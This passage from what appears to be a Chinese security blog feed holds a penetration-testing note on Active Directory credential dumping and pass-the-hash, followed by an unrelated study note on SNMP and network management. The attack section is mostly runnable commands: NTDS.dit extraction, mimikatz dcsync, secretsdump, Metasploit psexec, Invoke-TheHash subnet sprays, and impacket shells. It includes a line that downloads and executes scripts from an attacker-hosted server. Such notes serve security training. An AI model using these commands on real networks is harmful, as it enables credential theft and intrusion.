class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> C:\Windows\System32\config\SYSTEM <span class="literal">-LocalDestination</span> c:\system.hive</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Invoke-NinjaCopy</span> <span class="literal">-Path</span> <span class="string">&quot;C:\windows\ntds\ntds.dit&quot;</span> <span class="literal">-LocalDestination</span> C:\ntds.dit</span><br></pre></td></tr></table></figure><h2 id="解密NTDS-DIT文件"><a href="#解密NTDS-DIT文件" class="headerlink" title="解密NTDS.DIT文件"></a>解密NTDS.DIT文件</h2><h3 id="Mimikatz在线破解"><a href="#Mimikatz在线破解" class="headerlink" title="Mimikatz在线破解"></a>Mimikatz在线破解</h3><p>在线破解，不用将域控上的 ntds.dit 文件下载下来，直接在已有的shell上破解。</p><p>有一个cs弹回的beacon，就可以在beacon中直接利用mimikatz来破解，这一切的前提是<strong>有管理员权限</strong></p><p>Mimikatz有一个功能（dcsync），它可以利用<strong>目录复制服务</strong>（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。<br>在获得管理员权限后，通过Cobaltstrike弹回的beacon利用mimikatz模块进行密码Hash提取。</p><ul><li>获取mingy域内所有用户Hash</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:mingy.com /all /csv</span><br></pre></td></tr></table></figure><ul><li>查看单个用户的详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::dcsync /domain:mingy.com /user:krbtgt</span><br></pre></td></tr></table></figure><ul><li>查看所有用户的详细信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::lsa /inject</span><br></pre></td></tr></table></figure><h3 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h3><p>离线破解一般需要两步，首先就是将远端域控的 ntds.dit 和 SYSTEM下载到本地，然后再在本地进行破解。ntds.dit 文件一直在被 windows 系统占用，所以常规的复制下载方法是无法将文件下载到本地的。</p><ul><li>QuarksPwDump（不太好用）</li></ul><p>QuarksPwDump 是一款用于Windows用户凭据提取的开源工具，它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker。</p><p><strong>不太好用的主要原因是需要上传工具到目标主机，再去自动获取SYSKEY解密ntds.dit，而且但是容易被杀软查杀。</strong></p><ol><li>修复复制出来的数据库</li></ol><blockquote><p>esentutl是微软自带的工具，可以修复损坏或损坏的数据库。</p><p>适用于：Windows Server 2008、Windows Server 2012、Windows 8</p><p>有关如何使用此命令的示例，请参阅<a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh875504(v=ws.11)">示例</a>。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">esentutl /p /o ntds.dit</span><br></pre></td></tr></table></figure><ol start="2"><li>使用QuarksPwDump直接读取信息并将结果导出至文件</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\QuarksPwDump.exe --dump-hash-domain --output gingnir.top.txt --ntds-file .\破解\ntds.dit</span><br></pre></td></tr></table></figure><ul><li>SecretsDump</li></ul><p>通过<code>impacket</code>套件中的<code>secretsdump.py</code>脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secretsdump.exe -sam sam.hiv -security security.hiv -system sys.hiv LOCAL</span><br><span class="line">secretsdump.exe -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><blockquote><ul><li>LOCAL表示对本地文件进行解密</li><li>在对sam文件解密的时候，-security security.hiv，需要一个security.hiv的文件，同样也是在SAM文件同一个目录下</li></ul></blockquote><ul><li>NtdsAudit</li></ul><blockquote><p><a href="https://github.com/Dionach/NtdsAudit">https://github.com/Dionach/NtdsAudit</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NtdsAudit.exe &quot;ntds.dit&quot; -s &quot;system.hive&quot; -p pwdump.txt --users-csv users.csv</span><br></pre></td></tr></table></figure><h2 id="留下的痕迹（需要留意）"><a href="#留下的痕迹（需要留意）" class="headerlink" title="留下的痕迹（需要留意）"></a>留下的痕迹（需要留意）</h2><p>遗留日志文件</p><blockquote><ul><li>调用 Volume Shadow Copy 服务会产生日志文件，位于System下， <strong>Event ID 为 7036</strong></li><li>执行 ntdsutil snapshot “activate instance ntds” create quit quit 会额外产生 <strong>Event ID 为98</strong>的日志文件</li></ul><p>如下图<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208181451555.png" alt="image-20220804074903788"></p></blockquote><h1 id="PTH（Hash传递攻击）"><a href="#PTH（Hash传递攻击）" class="headerlink" title="PTH（Hash传递攻击）"></a>PTH（Hash传递攻击）</h1><h2 id="PTH简介"><a href="#PTH简介" class="headerlink" title="PTH简介"></a>PTH简介</h2><p>PASS THE Hash  也叫 Hash  传递攻击，简称 PTH 。模拟用户登录不需要用户明文密码，就可以直接用获取到的 Hash  来登录目标系统。<br>利用成功的前提条件是：</p><ul><li>开启 445 端口 SMB  服务</li><li>开启 admin$ 共享</li></ul><h2 id="Metasploit-psexec模块"><a href="#Metasploit-psexec模块" class="headerlink" title="Metasploit psexec模块"></a>Metasploit psexec模块</h2><p>msf中有三个模块可用来hash传递攻击.msf5是以前的版本了，若是msf6不行，那便换方法，主要去用<code>exploit/windows/smb/psexec</code>尝试吧</p><h3 id="psexec-command"><a href="#psexec-command" class="headerlink" title="psexec_command"></a>psexec_command</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行单个命令的PTH模块</span><br><span class="line">auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 &gt; use auxiliary/admin/smb/psexec_command</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set rhosts 192.168.1.52</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set smbuser administrator</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579110c49145015c47ecd267657d3174</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; set command &quot;whoami&quot;</span><br><span class="line">msf5 auxiliary(admin/smb/psexec_command) &gt; run</span><br></pre></td></tr></table></figure><h3 id="psexec（如果是新版msf，用这个就可）"><a href="#psexec（如果是新版msf，用这个就可）" class="headerlink" title="psexec（如果是新版msf，用这个就可）"></a>psexec（如果是新版msf，用这个就可）</h3><ul><li>工作组</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行直接就获取到meterpreter的PTH模块</span><br><span class="line">exploit/windows/smb/psexec</span><br><span class="line">msf5 &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts 192.168.1.52</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579110c49145015c47ecd267657d3174</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091729019.png" alt="image-20220809172838938" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091729683.png" style="zoom:50%;" /><ul><li>域</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set rhosts 10.10.10.201</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbdomain de1ay</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; set smbpass f67ce55ac831223d064010d8eaa2a273:d72c9b6670e05b0fb0ba01ff546776ab</span><br><span class="line">msf5 exploit(windows/smb/psexec) &gt; run</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091730775.png" alt="image-20220809173005622" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091730187.png" alt="image-20220809173019048" style="zoom:50%;" /><h3 id="psexec-psh"><a href="#psexec-psh" class="headerlink" title="psexec_psh"></a>psexec_psh</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">支持对一个网段进行PTH进行验证的模块</span><br><span class="line">exploit/windows/smb/psexec_psh</span><br><span class="line">msf5 &gt; use exploit/windows/smb/psexec_psh</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set rhosts 192.168.1.52</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbuser administrator</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:579110c49145015c47ecd267657d3174</span><br><span class="line">msf5 exploit(windows/smb/psexec_psh) &gt; run</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091731199.png" alt="image-20220809173105048" style="zoom:50%;" /><h2 id="Mimikatz-Hash传递攻击"><a href="#Mimikatz-Hash传递攻击" class="headerlink" title="Mimikatz Hash传递攻击"></a>Mimikatz Hash传递攻击</h2><p>当我们获得了内网中一台主机的NTLM哈希值，我们可以利用mimikatz对这个主机进行哈希传递攻击，执行命令成功后将会反弹回cmd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth </span><br><span class="line">/user:administrator /domain:192.168.78.67 </span><br><span class="line">/ntlm:579110c49145015c47ecd267657d3174&quot; exit</span><br></pre></td></tr></table></figure><p>在弹出的cmd中，我们还可以直接连接该主机，还可以查看目录文件等操作。该CMD已经具备了权限，已经通过验证。此时我们直接net use 不需要输入密码，即可直接使用共享（因为我们已经“通过了”验证）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\192.168.1.170\c$</span><br><span class="line">dir \\192.168.1.170\c$</span><br><span class="line">copy 1.exe \\192.168.1.170\c$</span><br><span class="line">net use h: \\192.168.1.170\c$</span><br></pre></td></tr></table></figure><h2 id="CobaltStrike-Hash传递攻击"><a href="#CobaltStrike-Hash传递攻击" class="headerlink" title="CobaltStrike Hash传递攻击"></a>CobaltStrike Hash传递攻击</h2><p>和上一节CS通过用户凭证横向移动很类似。要稍等一会</p><ul><li>工作组（看图说话~~）</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091733205.png" alt="image-20220809173306055" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091733163.png" alt="image-20220809173321039" style="zoom:50%;" /><ul><li>域</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091734054.png" alt="image-20220809173429910" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091734353.png" alt="image-20220809173448208" style="zoom: 50%;" /><h2 id="Powershell-Hash传递攻击"><a href="#Powershell-Hash传递攻击" class="headerlink" title="Powershell Hash传递攻击"></a>Powershell Hash传递攻击</h2><p>使用已知管理员hash，批量撞指定网段机器，此方式同时适用于工作组和域环境。而且powershell这种方法，可以达到“无文件落地”、“程序内存中加载执行”的效果，而且工具Windows基本上都内置了~~<br>需要同时加载Invoke-WMIExec.ps1、Invoke-TheHash.ps1</p><blockquote><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p><p><a href="https://www.jianshu.com/p/fb078a99e0d8">Powershell免杀从入门到实践</a></p></blockquote><ul><li>加载脚本</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass</span><br><span class="line">Import-Module .\Invoke-WMIExec.ps1</span><br><span class="line">Import-Module .\Invoke-TheHash.ps1</span><br><span class="line">powershell -exec bypass</span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.3.86:8000/Invoke-WMIExec.ps1&#x27;);</span><br><span class="line">IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.3.86:8000/Invoke-TheHash.ps1&#x27;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 -Username administrator -Hash 579110c49145015c47ecd267657d3174</span><br></pre></td></tr></table></figure><ul><li>利用已有管理员hash，批量撞指定网段机器。（很实用）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工作组：</span><br><span class="line">PS C:\Users\Administrator&gt; Invoke-TheHash -Type WMIExec -Target 192.168.1.0/24 -Username administrator -Hash b4e535a9bb56bcc084602062c9e2a9d4</span><br><span class="line">域：</span><br><span class="line">PS C:\Users\Administrator&gt; Invoke-TheHash -Type WMIExec -Target 10.10.10.0/24 -Domain de1ay -Username administrator -Hash e1c61709dffcf154ac9d77b5024f6d10</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208091736198.png" alt="image-20220809173638078"></p><h2 id="Impacket-Hash传递攻击"><a href="#Impacket-Hash传递攻击" class="headerlink" title="Impacket Hash传递攻击"></a>Impacket Hash传递攻击</h2><blockquote><p>Impacket 工具套件很好用</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#命令执行：</span></span><br><span class="line">python2 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">5791</span>10c49145015c47ecd267657d3174 administrator@<span class="number">192.168</span><span class="number">.1</span><span class="number">.52</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="comment">#反弹shell：</span></span><br><span class="line">python2 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">5791</span>10c49145015c47ecd267657d3174 administrator@<span class="number">192.168</span><span class="number">.1</span><span class="number">.52</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 横向移动 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 凭证获取 </tag>
            
            <tag> 横向移动 </tag>
            
            <tag> hash传递 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络管理&amp;SNMP</title>
      <link href="/2022-08-19-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86&amp;SNMP/"/>
      <url>/2022-08-19-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86&amp;SNMP/</url>
      
        <content type="html"><![CDATA[<h1 id="网络管理"><a href="#网络管理" class="headerlink" title="网络管理"></a>网络管理</h1><h2 id="网络管理引论"><a href="#网络管理引论" class="headerlink" title="网络管理引论"></a>网络管理引论</h2><h3 id="现状、必要性、网络管理的预期目标"><a href="#现状、必要性、网络管理的预期目标" class="headerlink" title="现状、必要性、网络管理的预期目标~"></a>现状、必要性、网络管理的预期目标~</h3><ol><li>机构网络的现状:</li></ol><ul><li>设备数量多：几百台</li><li>设备种类多：链路、交换机、路由器、主机、协议等</li></ul><ol start="2"><li>出现问题很正常</li></ol><ul><li>设备本身故障</li><li>配置问题</li><li>对资源（例如链路带宽)过度使用</li></ul><ol start="3"><li>网络管理的必要性</li></ol><ul><li>·协助网管定位和解决问题</li><li>提前发现问题，预警</li></ul><ol start="4"><li>希望网络管理达到的目标</li></ol><ul><li>监测网络（各部件)的运行状态</li><li>故障时异常时报警</li><li>允许管理人员千涉系统的运行（重启、配置参数等)</li><li>自动、远程（不需要去现场）！</li></ul><ol start="5"><li>网络管理的功能举例</li></ol><ul><li><p>检测主机或路由器的网卡故障（网卡发去的帧错误增加)</p></li><li><p>自动监测主机的活跃程度</p></li><li><p>监测流量：</p><blockquote><ul><li>某网段的流量增加，可以将服务器迁到另一个网段</li><li>某网段的流量超过阈值，在用户感知之前，升级带宽</li></ul></blockquote></li><li><p>路由表格的快速变化，配置问题，在网络发生问题前发现并修复</p></li><li><p>SLA监测：掉线率，延迟，吞吐量，达到下限报警</p></li><li><p>入侵检测：攻击行为，检测和报警</p></li></ul><h3 id="功能、定义"><a href="#功能、定义" class="headerlink" title="功能、定义"></a>功能、定义</h3><ol><li>功能</li></ol><ul><li>性能管理：</li></ul><blockquote><ul><li>性能（利用率、吞吐量）量化、测量、报告、分析和控制不同网络部件的性能</li><li>涉及到的部件：单独部件（网卡，协议实体)，端到端的路径</li></ul></blockquote><ul><li>故障管理：记录、检测和响应故障；</li></ul><blockquote><ul><li>性能管理为长期监测设备性能</li><li>故障管理：突然发生的强度大的性能降低，强调对故障的响应</li></ul></blockquote><ul><li>配置管理：跟踪设备的配置，管理设备配置信息</li><li>账户管理：定义、记录和控制用户和设备访问网络资源。管理用户、资源以及哪些用户可以使用哪些资源</li></ul><blockquote><ul><li>限额使用、给予使用的收费，以及分配资源访问权限</li></ul></blockquote><ul><li>安全管理：定义安全策略，控制对网络资源的使用</li></ul><ol start="2"><li>定义</li></ol><p>网络管理包括了硬件、软件和人类元素的设置、综合和协调，以便监测、测试、轮询、配置、分析、评价和控制网络和网元资源，用合理的成本满足实时性、透行性和服务质量的要求</p><h3 id="网管实质、体系结构、现有的网管协议"><a href="#网管实质、体系结构、现有的网管协议" class="headerlink" title="网管实质、体系结构、现有的网管协议"></a>网管实质、体系结构、现有的网管协议</h3><ol><li>网络管理的实质</li></ol><p>实质：远程（分布式) 监测（查询、定期上报，以及异常异步报告)和控制</p><p>实例：集团和分支机构</p><ul><li>分支定期报告，产量等信息</li><li>分支主动报告异常</li><li>总部问分支：上报信息（指标)</li><li>总部发出指令，让分支动作</li></ul><ol start="2"><li>网络管理体系结构</li></ol><ul><li><p>管理实体：在NOC网络管理工作站上的应用程序（老板)</p><blockquote><p>执行网络管理动作：收熟处理、分析、显示</p></blockquote></li><li><p>被管设备：主机、路由器、交换机、打印机、modem（分支机构)</p></li></ul><blockquote><ul><li><strong>被管设备</strong>包括若干<strong>被管对象</strong></li></ul><blockquote><p>硬件的一个部分（网卡）<br>某些硬件或软件的配置参数集合(RIP路由协议)</p></blockquote><ul><li>被管对象的信息收集在：本地<strong>管理信息库MIB</strong>中</li><li>被管设备中驻留网络管理代理agent,与管理实体通信，在被管设备上执行本地动作</li></ul></blockquote><ul><li>网络管理协议</li></ul><blockquote><ul><li>在管理实体和被管设备之间</li><li>允许实体查询设备的信息，报告异常事件</li><li>通过代理对设备间接地采取动作</li></ul></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190043415.png" alt="image-20220819004302290" style="zoom: 67%;" /><ol start="3"><li>目前已有的网络管理协议</li></ol><ul><li>OSI:CMISE&#x2F;CMIP</li><li>互联网：SNMP（SNMP仅仅是互联网网络管理体系中的一个组成部分）</li></ul><h2 id="互联网网络管理架构"><a href="#互联网网络管理架构" class="headerlink" title="互联网网络管理架构"></a>互联网网络管理架构</h2><ol><li>网管需要解决的问题</li></ol><ul><li>需要监视和控制被管设备的什么信息?</li></ul><blockquote><ul><li>被管设备需要管理和维护的信鼻：<strong>被管对象</strong></li></ul><blockquote><ul><li>例如：到目前为止接收到的错误分组个数，系统的描述信息等</li><li>需要命名标识和约定</li></ul></blockquote><ul><li>相关被管对象汇聚成：模块，被管设备中的被管模块形成本地存储MIB(Management Information Base)</li></ul></blockquote><ul><li>被控信息什么形式进行定义和传输?</li></ul><blockquote><ul><li>数据定义语言：SMl(Structure of Managerment Intormation)</li></ul><blockquote><ul><li>用整数，还是字符串还是什么表示这个被管对象</li><li>MIB库中的所有对象和模块采用SMl(ASN.1)定义，像C语言那样</li></ul></blockquote><ul><li>BER:定义的被管对象和模块采用BER转换成标准码流进行数据交换</li></ul></blockquote><ul><li>什么格式和时机进行管理信息的交换：SNMP协议</li></ul><p>SNMP协议和MIB、SMI相互独立便于独立演化</p><h3 id="SMI-管理信息结构"><a href="#SMI-管理信息结构" class="headerlink" title="SMI:管理信息结构"></a>SMI:管理信息结构</h3><p>被管对象的三个属性：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190106073.png" alt="image-20220819010648920"></p><h4 id="命名（标识）：0ID"><a href="#命名（标识）：0ID" class="headerlink" title="命名（标识）：0ID"></a>命名（标识）：0ID</h4><ol><li>一个唯一的标示</li></ol><ul><li>MB库由一堆对象构成，每个对象需要一个唯一标示</li><li>需要一个标示方法，SMI的内容之一</li><li>如：用什么ID标识某个P上网卡收到的数据包个数</li></ul><ol start="2"><li>对象的命名：0ID和01D树</li></ol><ul><li>平面命名：重名（命名或者编号），不便于管理，也不携带对象之间的关系</li></ul><blockquote><p>所以我们转用<strong>层次命名</strong>：像域名空间(好用)</p></blockquote><ul><li><p>一个对象的标示符（对象ID)唯一确定了在MIB层次结构中的一个被管对象</p></li><li><p>层次：一棵树，根不命名，一层层分配命名（有对应标号）</p></li><li><p>0ID:一个对象可以用从树根到树叶的节点名字（或者数字）来标示</p><blockquote><p>iso.org.dod.internet.mgmt.mib&lt;&#x3D;&gt;1.3.6.1.2.1</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190121692.png" alt="image-20220819012103547" style="zoom: 80%;" /><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190124234.png" alt="image-20220819012229424"></p></blockquote></li><li><p>MIB库就是一个按照层次组织起来的0ID（对象ID）集合</p></li></ul><blockquote><ul><li>对象构成组</li><li>(组+对象)构成模块</li><li>一些标准模块形成：MIB库</li></ul></blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190124783.png" alt="image-20220819012453607" style="zoom:67%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190127973.png" alt="image-20220819012753816" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190128298.png" alt="image-20220819012832116" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190129531.png" alt="image-20220819012927333" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208190130540.png" alt="image-20220819013015368" style="zoom:67%;" /><h4 id="语法（定义）：ASN-1"><a href="#语法（定义）：ASN-1" class="headerlink" title="语法（定义）：ASN.1"></a>语法（定义）：ASN.1</h4><ul><li>用来定义对象的数据类型（整数，字符串…)，类似c语言可以自定义数据结构</li><li>如：数据包个数用什么类型的数据结构表示</li><li>MIB库中的所有对象和模块采用SMl(ASN.1)定义，像C语言那样</li></ul><ol><li>对象的第2个属性：数据类型</li></ol><blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191018502.png" alt="image-20220819101844407"></p></blockquote><ol start="2"><li>SMI采用ASN.1的一些基本内容，另外增加了一些定义</li></ol><blockquote><ul><li>Abstract Syntax Notation One(ASN.1)是一个<strong>数据定义语言</strong>，用于定义MIB中被管对象，可以使其在获得机器无关的表示一致性</li><li>ASN.1采用变量和声明，类似于编程语言。而后面讲到的传输编码EBR像机器语言</li><li>提供供应商中立、跨平台、标准的语言，用于开发者来描述协议，系统和机器</li><li>像ASN.1的一致性语言允许不同类型的计算机能够更有效的分享信息</li></ul></blockquote><ol start="3"><li>ASN.1介绍</li></ol><blockquote><ul><li><p>ASN.1是SNMP用于创建实际MIB对象的数据表示格式</p></li><li><p>ASN.1在SNMP之前很早就存在</p></li><li><p>MIB的定义充分利用了ASN.1的优势</p></li><li><p>ASN.1是0SI的标准：IS08824</p></li><li><p>SNMP采用了ASN.1定义了<strong>交换报文的格式</strong>以及<strong>管理的对象</strong></p><p><strong>这意味着这种数据定义语言，不仅可以定义对象，也可以定义报文交换格式</strong></p></li></ul></blockquote><p>注：SNMP<strong>报文和被管对象（模块）都采用ASN.I定义</strong>；BER进行编码</p><ol start="4"><li>SMI中的基本数据类型</li></ol><p>3种在ASN.1中定义的简单数据类型+4种SM|中定义的数据类型</p><blockquote><ul><li>Integers-有符号整数，范围：-2,147,483,648 to 2,147,483,647.</li><li>Octet strings-字符串（每位字符编码在0到65535)</li><li>Object IDs -These values are from the set of all object identifiers allocated according to the rules specified inASN.1.实际上就是之前将的OID，OID也是应该数据结构</li></ul></blockquote><blockquote><ul><li>Network addresses-网络地址代表一个特性协议族的地址.SNMPv1支持32为1P地址</li><li>Counters-计数器值非负，可以增加一直到一个最大值，再增加到0.SNMPv1中，指定为32位计数器</li><li>Gauges          -Gauges非负，可以增加或者减少，但是保持一个它曾经到达过的最大值</li><li>Time ticks-time tick代表从某个时间开始多少时间，以10ms为单位.</li></ul></blockquote><ol start="5"><li><strong>被管理对象</strong>的类型（对象！！不同于基本数据类型）</li></ol><p>简单类型：<strong>标量对象</strong>(注意这是一个对象)</p><ul><li>定义一个单个对象实例（类似于：C中的变量)</li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191054572.png" alt="image-20220819105443427" style="zoom:50%;" /></blockquote><ul><li>SMI的基本数据类型</li></ul><blockquote><ul><li>Integer(4 bytes),来自ANS.1</li><li>String(var iable),来自ANS.1</li><li>Objectldentifier (variable)来自ANS.1</li><li>IPAddress(4 bytes),SMI增加</li><li>Counter(4 bytes),SMl增加</li><li>Gauge(4 bytes),SMl增加</li><li>TimeTicks(4 bytes),SMl增加</li></ul></blockquote><p>结构类型：</p><ul><li>简单类型和某些结构类型的组合</li><li>SMI定义了2种类型：sequence和sequence of</li><li>Sequence:1个sequence:数据类型是一些简单数据类型的组合(c.f.C中的结构体)(不同类型组合成结构体)</li><li>Sequence of:1个sequence of数据类型是简单类型的序列(c.f.C中的数组)（相同类型组合成数组）</li></ul><h4 id="传输编码：BER"><a href="#传输编码：BER" class="headerlink" title="传输编码：BER"></a>传输编码：BER</h4><p>SMI采用BER(Basic Encoding Rules)将SMI定义的被管对象值编码成传输的位串。定义编码从而在网络上进行传输的方法，形成什么样的码流以至于机器无关，语义相同</p><p>使得不同机器获得语义上的一致性</p><ul><li>仅仅内存拷贝解决不了通信问题</li><li>大端小端问题</li></ul><p>每个被传输的数据（对象值和SNMP字段）都有：TLV</p><ul><li>Type(1byte) - 3子字段</li></ul><blockquote><p>class (2 bit) + format (1 bit) + number (5 bit)</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191248829.png" alt="image-20220819124856688" style="zoom:50%;" /></blockquote><ul><li>Length:1个或多个字节</li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191249312.png" alt="image-20220819124941159" style="zoom:50%;" /></blockquote><ul><li>Value:根据BER定义的规则编码数据的值</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191255772.png" alt="image-20220819125503640"></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191257370.png" alt="image-20220819125701241"></p><h3 id="SNMP-互联网网络管理协议"><a href="#SNMP-互联网网络管理协议" class="headerlink" title="SNMP:互联网网络管理协议"></a>SNMP:互联网网络管理协议</h3><h4 id="网络管理协议"><a href="#网络管理协议" class="headerlink" title="网络管理协议"></a>网络管理协议</h4><p>网络管理，是指网络管理员通过网络管理程序对网络上的资源进行集中化管理的操作。网络管理系统中最重要的部分就是网络管理协议，它定义了网络管理器与被管代理间的通信方法。</p><p>在网络管理协议产生以前的相当长的时间里，管理者要学习各种从不同网络设备获取数据的方法。因为各个生产厂家使用专用的方法收集数据，相同功能的设备，不同的生产厂商提供的数据采集方法可能大相径庭。在这种情况下，制定一个行业标准的紧迫性越来越明显。</p><h4 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h4><p>简单网络管理协议(SNMP)已经成为事实上的标准网络管理协议。由于SNMP首先是IETF的研究小组为了解决在Internet上的路由器管理问题提出的，因此许多人认为SNMP在IP上运行的原因是Internet运行的是TCP&#x2F;IP协议，但事实上，SNMP是被设计成与协议无关的，所以它可以在IP、IPX、AppleTalk、OSI以及其他用到的传输协议上使用。</p><p>SNMP是由一系列协议组和规范组成的，它们提供了一种从网络上的设备中收集网络管理信息的方法。</p><p>从被管理设备中收集数据有两种方法：一种是轮询(polling-only)方法，另一种是基于中断(interrupt-based)的方法。</p><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208191302625.png" alt="image-20220819130214477" style="zoom:50%;" /></blockquote><h5 id="轮询-polling-only"><a href="#轮询-polling-only" class="headerlink" 